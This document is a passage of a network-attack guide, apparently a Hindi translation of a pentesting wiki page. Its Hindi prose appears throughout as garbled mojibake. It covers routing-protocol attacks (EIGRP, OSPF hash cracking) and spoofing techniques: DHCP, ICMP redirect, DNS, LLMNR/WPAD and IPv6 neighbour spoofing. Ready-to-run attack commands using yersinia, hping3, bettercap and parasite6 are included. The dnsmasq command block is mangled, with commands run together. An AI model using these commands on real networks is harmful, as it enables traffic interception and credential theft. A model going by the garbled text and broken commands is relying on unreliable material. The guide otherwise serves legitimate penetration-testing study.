**рд╕рд┐рд╕реНрдХреЛ рд╕рд┐рд╕реНрдЯрдореНрд╕ рдЗрдВрдЬреАрдирд┐рдпрд░реНрд╕ рдиреЗ рджреЛ FHRP рдкреНрд░реЛрдЯреЛрдХреЙрд▓, GLBP рдФрд░ HSRP, рд╡рд┐рдХрд╕рд┐рдд рдХрд┐рдП рд╣реИрдВред**

{% content-ref url="glbp-and-hsrp-attacks.md" %}
[glbp-and-hsrp-attacks.md](glbp-and-hsrp-attacks.md)
{% endcontent-ref %}

### RIP

рд░реВрдЯрд┐рдВрдЧ рдЗрдирдлрд╛рд░реНрдореЗрд╢рди рдкреНрд░реЛрдЯреЛрдХреЙрд▓ (RIP) рдХреЗ рддреАрди рд╕рдВрд╕реНрдХрд░рдг рдореМрдЬреВрдж рд╣реИрдВ: RIP, RIPv2, рдФрд░ RIPngред RIP рдФрд░ RIPv2 рджреНрд╡рд╛рд░рд╛ UDP рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдкреЛрд░реНрдЯ 520 рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдкреАрдпрд░реНрд╕ рдХреЛ рдбреЗрдЯрд╛рдЧреНрд░рд╛рдо рднреЗрдЬреЗ рдЬрд╛рддреЗ рд╣реИрдВ, рдЬрдмрдХрд┐ RIPng рджреНрд╡рд╛рд░рд╛ IPv6 рдорд▓реНрдЯреАрдХрд╛рд╕реНрдЯ рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ UDP рдкреЛрд░реНрдЯ 521 рдкрд░ рдбреЗрдЯрд╛рдЧреНрд░рд╛рдо рдкреНрд░рд╕рд╛рд░рд┐рдд рдХрд┐рдП рдЬрд╛рддреЗ рд╣реИрдВред RIPv2 рдиреЗ MD5 рдкреНрд░рдорд╛рдгреАрдХрд░рдг рдХрд╛ рд╕рдорд░реНрдерди рдХрд┐рдпрд╛ред рд╡рд╣реАрдВ, RIPng рдореЗрдВ рдореВрд▓ рдкреНрд░рдорд╛рдгреАрдХрд░рдг рд╢рд╛рдорд┐рд▓ рдирд╣реАрдВ рд╣реИ; рдЗрд╕рдХреЗ рдмрдЬрд╛рдп, IPv6 рдореЗрдВ IPsec AH рдФрд░ ESP рд╣реЗрдбрд░ рдкрд░ рдирд┐рд░реНрднрд░рддрд╛ рд╣реИред

* **RIP рдФрд░ RIPv2:** UDP рдбреЗрдЯрд╛рдЧреНрд░рд╛рдо рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рд╕рдВрдЪрд╛рд░ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ рдкреЛрд░реНрдЯ 520 рдкрд░ред
* **RIPng:** IPv6 рдорд▓реНрдЯреАрдХрд╛рд╕реНрдЯ рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ UDP рдкреЛрд░реНрдЯ 521 рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддрд╛ рд╣реИ рдбреЗрдЯрд╛рдЧреНрд░рд╛рдо рдкреНрд░рд╕рд╛рд░рд┐рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдПред

рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ RIPv2 MD5 рдкреНрд░рдорд╛рдгреАрдХрд░рдг рдХрд╛ рд╕рдорд░реНрдерди рдХрд░рддрд╛ рд╣реИ рдЬрдмрдХрд┐ RIPng рдореЗрдВ рдореВрд▓ рдкреНрд░рдорд╛рдгреАрдХрд░рдг рд╢рд╛рдорд┐рд▓ рдирд╣реАрдВ рд╣реИ, рдЬрд┐рд╕рдХрд╛ рдЖрдзрд╛рд░ IPv6 рдореЗрдВ IPsec AH рдФрд░ ESP рд╣реЗрдбрд░ рдкрд░ рд╣реИред

### EIGRP рд╣рдорд▓реЗ

**EIGRP (Enhanced Interior Gateway Routing Protocol)** рдПрдХ рдЧрддрд┐рд╢реАрд▓ рд░реВрдЯрд┐рдВрдЧ рдкреНрд░реЛрдЯреЛрдХреЙрд▓ рд╣реИред **рдпрджрд┐ рдХреЛрдИ рдкреНрд░рдорд╛рдгреАрдХрд░рдг рдирд╣реАрдВ** рд╣реИ рдФрд░ рдкреИрд╕рд┐рд╡ рдЗрдВрдЯрд░рдлреЗрд╕ рдХреЗ рдХреЙрдиреНрдлрд╝рд┐рдЧрд░реЗрд╢рди рдирд╣реАрдВ рд╣реИ, рддреЛ **рдПрдХ рдЕрддрд┐рдХреНрд░рдордгрдХрд╛рд░реА** EIGRP рд░реВрдЯрд┐рдВрдЧ рдореЗрдВ рд╣рд╕реНрддрдХреНрд╖реЗрдк рдХрд░ рд╕рдХрддрд╛ рд╣реИ рдФрд░ **рд░реВрдЯрд┐рдВрдЧ рддрд╛рд▓рд┐рдХрд╛рдПрдБ рдкреЙрдЗрдЬрд╝рдирд┐рдВрдЧ** рдХрд╛ рдХрд╛рд░рдг рдмрди рд╕рдХрддрд╛ рд╣реИред рдЗрд╕рдХреЗ рдЕрддрд┐рд░рд┐рдХреНрдд, EIGRP рдиреЗрдЯрд╡рд░реНрдХ (рдЕрдиреНрдп рд╢рдмреНрджреЛрдВ рдореЗрдВ, рд╕реНрд╡рддрдВрддреНрд░ рдкреНрд░рдгрд╛рд▓реА) **рд╕рдорддрд▓ рд╣реИ рдФрд░ рдХрд┐рд╕реА рднреА рдХреНрд╖реЗрддреНрд░ рдореЗрдВ рд╡рд┐рднрд╛рдЬрди рдирд╣реАрдВ рд╣реИ**ред рдпрджрд┐ **рдХреЛрдИ рд╣рдорд▓рд╛рд╡рд░ рдПрдХ рд░реВрдЯ рдЗрдВрдЬреЗрдХреНрдЯ рдХрд░рддрд╛ рд╣реИ**, рддреЛ рд╕рдВрднрд╛рд╡рдирд╛ рд╣реИ рдХрд┐ рдпрд╣ рд░реВрдЯ рдЖрддреНрдордирд┐рд░реНрднрд░ EIGRP рд╕рд┐рд╕реНрдЯрдо рдореЗрдВ **рдлреИрд▓ рдЬрд╛рдПрдЧрд╛**ред

EIGRP рд╕рд┐рд╕реНрдЯрдо рдкрд░ рд╣рдорд▓рд╛ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП **рдПрдХ рд╡реИрдз EIGRP рд░рд╛рдЙрдЯрд░ рдХреЗ рд╕рд╛рде рдПрдХ рдкрдбрд╝реЛрд╕реА рдХреЛ рд╕реНрдерд╛рдкрд┐рдд рдХрд░рдирд╛** рдЖрд╡рд╢реНрдпрдХ рд╣реИ, рдЬреЛ рдореВрд▓ рдЬрд╛рд╕реВрд╕реА рд╕реЗ рд▓реЗрдХрд░ рд╡рд┐рднрд┐рдиреНрди рдЗрдВрдЬреЗрдХреНрд╢рдиреНрд╕ рддрдХ рдХрдИ рд╕рдВрднрд╛рд╡рдирд╛рдПрдБ рдЦреЛрд▓рддрд╛ рд╣реИред

[**FRRouting**](https://frrouting.org/) рдЖрдкрдХреЛ **BGP, OSPF, EIGRP, RIP рдФрд░ рдЕрдиреНрдп рдкреНрд░реЛрдЯреЛрдХреЙрд▓ рдХрд╛ рд╕рдорд░реНрдерди рдХрд░рдиреЗ рд╡рд╛рд▓рд╛ рдПрдХ рд╡рд░реНрдЪреБрдЕрд▓ рд░рд╛рдЙрдЯрд░ рд▓рд╛рдЧреВ рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИ**ред рдЖрдкрдХреЛ рдмрд╕ рдЗрд╕реЗ рдЕрдкрдиреЗ рд╣рдорд▓рд╛рд╡рд░ рдХреЗ рд╕рд┐рд╕реНрдЯрдо рдкрд░ рдбрд┐рдкреНрд▓реЙрдп рдХрд░рдирд╛ рд╣реИ рдФрд░ рдЖрдк рд╡рд╛рд╕реНрддрд╡ рдореЗрдВ рд░реВрдЯрд┐рдВрдЧ рдбреЛрдореЗрди рдореЗрдВ рдПрдХ рд╡реИрдз рд░рд╛рдЙрдЯрд░ рдмрдирдиреЗ рдХрд╛ рджрд┐рдЦрд╛рд╡рд╛ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред

{% content-ref url="eigrp-attacks.md" %}
[eigrp-attacks.md](eigrp-attacks.md)
{% endcontent-ref %}

[**Coly**](https://code.google.com/p/coly/) EIGRP (Enhanced Interior Gateway Routing Protocol) рдмреНрд░реЙрдбрдХрд╛рд╕реНрдЯ рдХреЛ рдЕрдВрддрд░реНрджреГрд╖реНрдЯрд┐ рдХрд░рдиреЗ рдФрд░ рдкреИрдХреЗрдЯ рдЗрдВрдЬреЗрдХреНрд╢рди рдХрд░рдиреЗ рдХреА рдХреНрд╖рдорддрд╛рдУрдВ рдХреЗ рд▓рд┐рдП рд╣реИред рдпрд╣ рдкреИрдХреЗрдЯ рдмрджрд▓рдиреЗ рдХреЗ рд▓рд┐рдП рдЙрдкрдпреЛрдЧ рдХрд┐рдП рдЬрд╛ рд╕рдХрддреЗ рд╣реИрдВред

### OSPF

рдУрдкрди рд╢реЙрд░реНрдЯреЗрд╕реНрдЯ рдкрд╛рде рдлрд░реНрд╕реНрдЯ (OSPF) рдкреНрд░реЛрдЯреЛрдХреЙрд▓ рдореЗрдВ **MD5 рдкреНрд░рдорд╛рдгреАрдХрд░рдг рд╕реБрдирд┐рд╢реНрдЪрд┐рдд рд╕рдВрдЪрд╛рд░ рдХреЗ рд▓рд┐рдП рд╕рд╛рдорд╛рдиреНрдп рд░реВрдк рд╕реЗ рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ**ред рд╣рд╛рд▓рд╛рдВрдХрд┐, рдЗрд╕ рд╕реБрд░рдХреНрд╖рд╛ рдЙрдкрд╛рдп рдХреЛ рд▓реЛрдХреА рдФрд░ рдЬреЙрди рдж рд░рд┐рдкрд░ рдЬреИрд╕реЗ рдЙрдкрдХрд░рдгреЛрдВ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рднрдВрдЧ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред рдпреЗ рдЙрдкрдХрд░рдг MD5 рд╣реИрд╢ рдХреЛ рдХреИрдкреНрдЪрд░ рдФрд░ рдХреНрд░реИрдХ рдХрд░рдиреЗ рдХреА рдХреНрд╖рдорддрд╛ рд░рдЦрддреЗ рд╣реИрдВ, рдкреНрд░рдорд╛рдгреАрдХрд░рдг рдХреБрдВрдЬреА рдХреЛ рдЙрдЬрд╛рдЧрд░ рдХрд░рддреЗ рд╣реИрдВред рдПрдХ рдмрд╛рд░ рдЬрдм рдпрд╣ рдХреБрдВрдЬреА рдкреНрд░рд╛рдкреНрдд рд╣реЛ рдЬрд╛рддреА рд╣реИ, рддреЛ рдирдП рд░реВрдЯрд┐рдВрдЧ рд╕реВрдЪрдирд╛ рджрд░реНрдЬ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЗрд╕рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред рд░реВрдЯ рдкреИрд░рд╛рдореАрдЯрд░ рдХреЙрдиреНрдлрд╝рд┐рдЧрд░ рдХрд░рдиреЗ рдФрд░ рд╕рдВрджрд░реНрдн рдХреБрдВрдЬреА рд╕реНрдерд╛рдкрд┐рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП, _рдЗрдВрдЬреЗрдХреНрд╢рди_ рдФрд░ _рдХрдиреЗрдХреНрд╢рди_ рдЯреИрдм рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред

* **MD5 рд╣реИрд╢ рдХреЛ рдХреИрдкреНрдЪрд░ рдФрд░ рдХреНрд░реИрдХ рдХрд░рдирд╛:** рдЗрд╕ рдЙрджреНрджреЗрд╢реНрдп рдХреЗ рд▓рд┐рдП рд▓реЛрдХреА рдФрд░ рдЬреЙрди рдж рд░рд┐рдкрд░ рдЬреИрд╕реЗ рдЙрдкрдХрд░рдгреЛрдВ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред
* **рд░реВрдЯ рдкреИрд░рд╛рдореАрдЯрд░ рдХреЙрдиреНрдлрд╝рд┐рдЧрд░ рдХрд░рдирд╛:** рдпрд╣ _рдЗрдВрдЬреЗрдХреНрд╢рди_ рдЯреИрдм рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред
* **рднрдВрдЧрд┐рдд рдХреБрдВрдЬреА рд╕реЗрдЯ рдХрд░рдирд╛:** рдХреБрдВрдЬреА _рдХрдиреЗрдХреНрд╢рди_ рдЯреИрдм рдХреЗ рддрд╣рдд рдХреЙрдиреНрдлрд╝рд┐рдЧрд░ рдХреА рдЬрд╛рддреА рд╣реИред

### рдЕрдиреНрдп рд╕рд╛рдорд╛рдиреНрдп рдЙрдкрдХрд░рдг рдФрд░ рд╕реНрд░реЛрдд

* [**Above**](https://github.com/c4s73r/Above): рдиреЗрдЯрд╡рд░реНрдХ рдЯреНрд░реИрдлрд┐рдХ рд╕реНрдХреИрди рдХрд░рдиреЗ рдФрд░ рд╕реБрд░рдХреНрд╖рд╛рддреНрдордХрддрд╛ рдЦреЛрдЬрдиреЗ рдХреЗ рд▓рд┐рдП рдЙрдкрдХрд░рдг
* рдЖрдк рдиреЗрдЯрд╡рд░реНрдХ рд╣рдорд▓реЛрдВ рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ **рдЕрдзрд┐рдХ рдЬрд╛рдирдХрд╛рд░реА** [**рдпрд╣рд╛рдБ**](https://github.com/Sab0tag3d/MITM-cheatsheet) рдкрд╛ рд╕рдХрддреЗ рд╣реИрдВред

## **рд╕реНрдкреВрдлрд┐рдВрдЧ**

рд╣рдорд▓рд╛рд╡рд░ рдирдХрд▓реА DHCP рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛рдПрдБ рднреЗрдЬрдХрд░ рдиреЗрдЯрд╡рд░реНрдХ рдХреЗ рдирдП рд╕рджрд╕реНрдп рдХреЗ рд╕рднреА рдиреЗрдЯрд╡рд░реНрдХ рдкреИрд░рд╛рдореАрдЯрд░ (рдЬреАрдбрдмреНрд▓реНрдпреВ, рдЖрдИрдкреА, рдбреАрдПрдирдПрд╕) рдХреЙрдиреНрдлрд╝рд┐рдЧрд░ рдХрд░рддрд╛ рд╣реИред

```bash
Ettercap
yersinia dhcp -attack 2 #More parameters are needed
```

### ARP рд╕реНрдкреВрдлрд┐рдВрдЧ

[рдкрд┐рдЫрд▓реЗ рдЦрдВрдб](./#arp-spoofing) рдХреА рдЬрд╛рдБрдЪ рдХрд░реЗрдВред

### ICMPRedirect

ICMP Redirect рдореЗрдВ рдПрдХ ICMP рдкреИрдХреЗрдЯ рдкреНрд░рдХрд╛рд░ 1 рдХреЛрдб 5 рднреЗрдЬрдирд╛ рд╢рд╛рдорд┐рд▓ рд╣реИ рдЬреЛ рдЗрд╕рдХрд╛ рд╕рдВрдХреЗрдд рджреЗрддрд╛ рд╣реИ рдХрд┐ рд╣рдорд▓рд╛рд╡рд░ рдХреЛ рдПрдХ рдЖрдИрдкреА рддрдХ рдкрд╣реБрдБрдЪрдиреЗ рдХрд╛ рд╕рдмрд╕реЗ рдЕрдЪреНрдЫрд╛ рддрд░реАрдХрд╛ рд╣реИред рдлрд┐рд░, рдЬрдм рдкреАрдбрд╝рд┐рдд рдЖрдИрдкреА рд╕реЗ рд╕рдВрдкрд░реНрдХ рдХрд░рдирд╛ рдЪрд╛рд╣рддрд╛ рд╣реИ, рддреЛ рд╡рд╣ рдкреИрдХреЗрдЯ рд╣рдорд▓рд╛рд╡рд░ рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рднреЗрдЬреЗрдЧрд╛ред

```bash
Ettercap
icmp_redirect
hping3 [VICTIM IP ADDRESS] -C 5 -K 1 -a [VICTIM DEFAULT GW IP ADDRESS] --icmp-gw [ATTACKER IP ADDRESS] --icmp-ipdst [DST IP ADDRESS] --icmp-ipsrc [VICTIM IP ADDRESS] #Send icmp to [1] form [2], route to [3] packets sent to [4] from [5]
```

### DNS рд╕реНрдкреВрдлрд┐рдВрдЧ

рд╣рдорд▓рд╛рд╡рд░ рд╡рд╣ рд╡рд┐рдХреНрдЯрд┐рдо рдХреЗ рд▓рд┐рдП рдХреБрдЫ (рдпрд╛ рд╕рднреА) рдбреЛрдореЗрди рдкрддрд╛ рд▓рдЧрд╛рдПрдЧрд╛ рдЬрд┐рдирдХрд╛ рд╡рд┐рдХреНрдЯрд┐рдо рд╕реЗ рдкреВрдЫрддрд╛ рд╣реИред

```bash
set dns.spoof.hosts ./dns.spoof.hosts; dns.spoof on
```

**dnsmasq рдХреЗ рд╕рд╛рде рдЕрдкрдирд╛ DNS рдХреЙрдиреНрдлрд╝рд┐рдЧрд░ рдХрд░реЗрдВ**

```bash
apt-get install dnsmasqecho "addn-hosts=dnsmasq.hosts" > dnsmasq.conf #Create dnsmasq.confecho "127.0.0.1   domain.example.com" > dnsmasq.hosts #Domains in dnsmasq.hosts will be the domains resolved by the Dsudo dnsmasq -C dnsmasq.conf --no-daemon
dig @localhost domain.example.com # Test the configured DNS
```

### рд╕реНрдерд╛рдиреАрдп рдЧреЗрдЯрд╡реЗ

рдЕрдХреНрд╕рд░ рд╕рд┐рд╕реНрдЯрдо рдФрд░ рдиреЗрдЯрд╡рд░реНрдХ рдХреЗ рд▓рд┐рдП рдХрдИ рдорд╛рд░реНрдЧ рдореМрдЬреВрдж рд╣реЛрддреЗ рд╣реИрдВред рд╕реНрдерд╛рдиреАрдп рдиреЗрдЯрд╡рд░реНрдХ рдореЗрдВ MAC рдкрддреЛрдВ рдХреА рд╕реВрдЪреА рдмрдирд╛рдиреЗ рдХреЗ рдмрд╛рдж, _gateway-finder.py_ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░реЗрдВ рддрд╛рдХрд┐ IPv4 рдлреЙрд░рд╡рд░реНрдбрд┐рдВрдЧ рдХрд╛ рд╕рдорд░реНрдерди рдХрд░рдиреЗ рд╡рд╛рд▓реЗ рд╣реЛрд╕реНрдЯ рдХреА рдкрд╣рдЪрд╛рди рдХреА рдЬрд╛ рд╕рдХреЗред

```
root@kali:~# git clone https://github.com/pentestmonkey/gateway-finder.git
root@kali:~# cd gateway-finder/
root@kali:~# arp-scan -l | tee hosts.txt
Interface: eth0, datalink type: EN10MB (Ethernet)
Starting arp-scan 1.6 with 256 hosts (http://www.nta-monitor.com/tools/arp-scan/)
10.0.0.100     00:13:72:09:ad:76       Dell Inc.
10.0.0.200     00:90:27:43:c0:57       INTEL CORPORATION
10.0.0.254     00:08:74:c0:40:ce       Dell Computer Corp.

root@kali:~/gateway-finder# ./gateway-finder.py -f hosts.txt -i 209.85.227.99
gateway-finder v1.0 http://pentestmonkey.net/tools/gateway-finder
[+] Using interface eth0 (-I to change)
[+] Found 3 MAC addresses in hosts.txt
[+] We can ping 209.85.227.99 via 00:13:72:09:AD:76 [10.0.0.100]
[+] We can reach TCP port 80 on 209.85.227.99 via 00:13:72:09:AD:76 [10.0.0.100]
```

### [LLMNR, NBT-NS, рдФрд░ mDNS рдХрд╛ рдзреЛрдЦрд╛ рджреЗрдирд╛](spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md)

DNS рд▓реБрдХрдЕрдк рдЕрд╕рдлрд▓ рд╣реЛрдиреЗ рдкрд░ рд╕реНрдерд╛рдиреАрдп рд╣реЛрд╕реНрдЯ рдирд┐рд░реНрдзрд╛рд░рдг рдХреЗ рд▓рд┐рдП рдорд╛рдЗрдХреНрд░реЛрд╕реЙрдлреНрдЯ рд╕рд┐рд╕реНрдЯрдо **Link-Local Multicast Name Resolution (LLMNR)** рдФрд░ **NetBIOS Name Service (NBT-NS)** рдкрд░ рдЖрд╢реНрд░рд┐рдд рд╣реИред рдЙрд╕реА рддрд░рд╣, **Apple Bonjour** рдФрд░ **Linux zero-configuration** рдЕрдорд▓рди рдореЗрдВ **Multicast DNS (mDNS)** рдХрд╛ рдЙрдкрдпреЛрдЧ рдиреЗрдЯрд╡рд░реНрдХ рдореЗрдВ рд╕рд┐рд╕реНрдЯрдо рдЦреЛрдЬрдиреЗ рдХреЗ рд▓рд┐рдП рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред рдЗрди рдкреНрд░реЛрдЯреЛрдХреЙрд▓реЛрдВ рдХреА рдкреНрд░рдорд╛рдгрд┐рдд рдирд┐рд░реНрджреЗрд╢рд┐рдХрд╛ рдФрд░ UDP рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдХрд╛рд░реНрдп рдХрд░рдиреЗ рдХреЗ рдХрд╛рд░рдг, рд╕рдВрджреЗрд╢ рдкреНрд░рд╕рд╛рд░рдг рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП, рд╣рдорд▓рд╛рд╡рд╛рджрд┐рдпреЛрдВ рджреНрд╡рд╛рд░рд╛ рдЗрди рдкреНрд░реЛрдЯреЛрдХреЙрд▓реЛрдВ рдХрд╛ рд╢реЛрд╖рдг рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ рдЬреЛ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛рдУрдВ рдХреЛ рджреБрд░реБрдкрдпреЛрдЧреА рд╕реЗрд╡рд╛рдУрдВ рдкрд░ рдкреБрдирд░реНрдирд┐рд░реНрджреЗрд╢рд┐рдд рдХрд░рдиреЗ рдХрд╛ рд▓рдХреНрд╖реНрдп рд░рдЦрддреЗ рд╣реИрдВред

рдЖрдк Responder рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдЬрд╛рд▓реА рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛рдПрдБ рднреЗрдЬрдХрд░ рд╣реЛрд╕реНрдЯ рджреНрд╡рд╛рд░рд╛ рдЦреЛрдЬреА рдЬрд╛рдиреЗ рд╡рд╛рд▓реА рд╕реЗрд╡рд╛рдУрдВ рдХрд╛ рдЕрдиреБрдХрд░рдг рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред\
рдФрд░ рдЕрдзрд┐рдХ рдЬрд╛рдирдХрд╛рд░реА рдХреЗ рд▓рд┐рдП [рдпрд╣рд╛рдБ рдХреНрд▓рд┐рдХ рдХрд░реЗрдВ Responder рдХреЗ рд╕рд╛рде рд╕реЗрд╡рд╛рдУрдВ рдХрд╛ рдЕрдиреБрдХрд░рдг рдХреИрд╕реЗ рдХрд░реЗрдВ](spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md)ред

### [WPAD рдХрд╛ рдзреЛрдЦрд╛ рджреЗрдирд╛](spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md)

рдмреНрд░рд╛рдЙрдЬрд╝рд░ рд╕рд╛рдорд╛рдиреНрдпрдд: **Web Proxy Auto-Discovery (WPAD)** рдкреНрд░реЛрдЯреЛрдХреЙрд▓ рдХрд╛ рдЙрдкрдпреЛрдЧ рд╕реНрд╡рдЪрд╛рд▓рд┐рдд рд░реВрдк рд╕реЗ рдкреНрд░реЙрдХреНрд╕реА рд╕реЗрдЯрд┐рдВрдЧ рдкреНрд░рд╛рдкреНрдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдХрд░рддреЗ рд╣реИрдВред рдЗрд╕рдореЗрдВ рд╡рд┐рд╢реЗрд╖ рд░реВрдк рд╕реЗ "http://wpad.example.org/wpad.dat" рдЬреИрд╕реЗ URL рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рд╕рд░реНрд╡рд░ рд╕реЗ рд╡рд┐рдиреНрдпрд╛рд╕ рд╡рд┐рд╡рд░рдг рдкреНрд░рд╛рдкреНрдд рдХрд░рдирд╛ рд╢рд╛рдорд┐рд▓ рд╣реИред рдЧреНрд░рд╛рд╣рдХреЛрдВ рджреНрд╡рд╛рд░рд╛ рдЗрд╕ рд╕рд░реНрд╡рд░ рдХреА рдЦреЛрдЬ рдХрдИ рддрд░реАрдХреЛрдВ рд╕реЗ рд╣реЛ рд╕рдХрддреА рд╣реИ:

* **DHCP** рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ, рдЬрд╣рд╛рдВ рдЦреЛрдЬ рдХреЛ рд╡рд┐рд╢реЗрд╖ рдХреЛрдб 252 рдкреНрд░рд╡рд┐рд╖реНрдЯрд┐ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рд╕реБрд╡рд┐рдзрд╛рдЬрдирдХ рдмрдирд╛рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред
* **DNS** рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ, рдЬрд┐рд╕рдореЗрдВ рд╕реНрдерд╛рдиреАрдп рдбреЛрдореЗрди рдореЗрдВ рд▓реЗрдмрд▓ _wpad_ рдХреА рдЦреЛрдЬ рдХреА рдЬрд╛рддреА рд╣реИред
* **Microsoft LLMNR рдФрд░ NBT-NS** рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ, рдЬреЛ рд╡реЗ рд╕реНрдерд┐рддрд┐рдпреЛрдВ рдореЗрдВ рдЙрдкрдпреЛрдЧ рдХрд┐рдП рдЬрд╛рддреЗ рд╣реИрдВ рдЬрд╣рд╛рдВ DNS рд▓реБрдХрдЕрдк рд╕рдлрд▓ рдирд╣реАрдВ рд╣реЛрддреЗ рд╣реИрдВред

рдЙрдкрдХрд░рдг Responder рдЗрд╕ рдкреНрд░реЛрдЯреЛрдХреЙрд▓ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдПрдХ **рдХреБрдЯрд┐рд▓ WPAD рд╕рд░реНрд╡рд░** рдХреЗ рд░реВрдк рдореЗрдВ рдХрд╛рдо рдХрд░рддрд╛ рд╣реИред рдпрд╣ DHCP, DNS, LLMNR, рдФрд░ NBT-NS рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдЧреНрд░рд╛рд╣рдХреЛрдВ рдХреЛ рдЗрд╕рд╕реЗ рдХрдиреЗрдХреНрдЯ рд╣реЛрдиреЗ рдХреЗ рд▓рд┐рдП рдЧреБрдорд░рд╛рд╣ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЙрдкрдпреЛрдЧ рдХрд░рддрд╛ рд╣реИред рдФрд░ рдпрд╣рд╛рдБ рдФрд░ рдЧрд╣рд░рд╛рдИ рд╕реЗ рдЬрд╛рдирдиреЗ рдХреЗ рд▓рд┐рдП рдХрд┐ рд╕реЗрд╡рд╛рдПрдВ рдХреИрд╕реЗ рдЕрдиреБрдХреГрдд рдХреА рдЬрд╛ рд╕рдХрддреА рд╣реИрдВ Responder рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ [рдпрд╣рд╛рдБ рдХреНрд▓рд┐рдХ рдХрд░реЗрдВ](spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md)ред

### [SSDP рдФрд░ UPnP рдЙрдкрдХрд░рдгреЛрдВ рдХрд╛ рдзреЛрдЦрд╛ рджреЗрдирд╛](spoofing-ssdp-and-upnp-devices.md)

рдЖрдк рдиреЗрдЯрд╡рд░реНрдХ рдореЗрдВ рд╡рд┐рднрд┐рдиреНрди рд╕реЗрд╡рд╛рдПрдВ рдкреНрд░рджрд╛рди рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рддрд╛рдХрд┐ рдПрдХ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЛ рдХреБрдЫ рд╕рд╛рджрд╛-рдкрд╛рда рдкреНрд░рдорд╛рдгрдкрддреНрд░ рджрд░реНрдЬ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдзреЛрдЦрд╛ рджреЗ рд╕рдХреЗрдВред **рдЗрд╕ рд╣рдорд▓реЗ рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рдЕрдзрд┐рдХ рдЬрд╛рдирдХрд╛рд░реА рдХреЗ рд▓рд┐рдП** [**SSDP рдФрд░ UPnP рдЙрдкрдХрд░рдгреЛрдВ рдХрд╛ рдзреЛрдЦрд╛ рджреЗрдирд╛**](spoofing-ssdp-and-upnp-devices.md)\*\* рдореЗрдВред\*\*

### IPv6 Neighbor Spoofing

рдпрд╣ рд╣рдорд▓рд╛ ARP Spoofing рдХреЗ рдмрд╣реБрдд рд╣реА рд╕рдорд╛рди рд╣реИ рд▓реЗрдХрд┐рди IPv6 рд╡рд┐рд╢реНрд╡ рдореЗрдВред рдЖрдк рдкреАрдбрд╝рд┐рдд рдХреЛ рдпрд╣рд╛рдВ рд╡рд┐рд╢реНрд╡рд╛рд╕ рдХрд░рд╛ рд╕рдХрддреЗ рд╣реИрдВ рдХрд┐ рдЧреЗрдЯрд╡реЗ рдХрд╛ IPv6 рдЖрдкрдХреЗ рд╣рдорд▓рд╛рд╡рд╛рджрдХ рдХрд╛ MAC рд╣реИред

```bash
sudo parasite6 -l eth0 # This option will respond to every requests spoofing the address that was requested
sudo fake_advertise6 -r -w 2 eth0 <Router_IPv6> #This option will send the Neighbor Advertisement packet every 2 seconds
```

### IPv6 рд░рд╛рдЙрдЯрд░ рд╡рд┐рдЬреНрдЮрд╛рдкрди рд╕реНрдкреВрдлрд┐рдВрдЧ/рдлреНрд▓рдбрд┐рдВрдЧ

